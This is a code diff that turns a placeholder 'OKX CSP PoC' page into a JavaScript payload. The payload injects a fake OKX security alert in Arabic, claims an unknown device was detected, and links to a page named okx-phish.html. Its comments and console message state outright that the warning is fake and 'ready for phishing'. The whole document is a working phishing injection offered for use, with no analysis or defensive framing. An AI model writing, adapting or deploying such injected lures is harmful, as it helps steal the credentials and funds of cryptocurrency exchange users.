@@ -1,1 +1,27 @@
-<html><body>OKX CSP PoC</body></html>
+
+(function() {
+    // إنشاء رسالة تحذير مزيفة تبدو رسمية
+    const warning = document.createElement('div');
+    warning.innerHTML = `
+        <div style="
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #fff8e1;
+            border: 2px solid #ffc107;
+            padding: 16px;
+            border-radius: 8px;
+            font-family: sans-serif;
+            z-index: 999999;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            max-width: 400px;
+        ">
+            <strong style="color: #ff9800;">⚠️ تنبيه أمني من OKX</strong><br>
+            تم اكتشاف جهاز غير معروف. يرجى <a href="https://brillistrz-ctrl.github.io/okx-phish.html" style="color: #1976d2; text-decoration: underline;">التحقق الآن</a> لتأمين حسابك.
+        </div>
+    `;
+    document.body.appendChild(warning);
+
+    // اختياري: سجّل البيانات كما فعلت سابقًا
+    console.log("[OKX] Fake warning injected. Ready for phishing.");
+})();
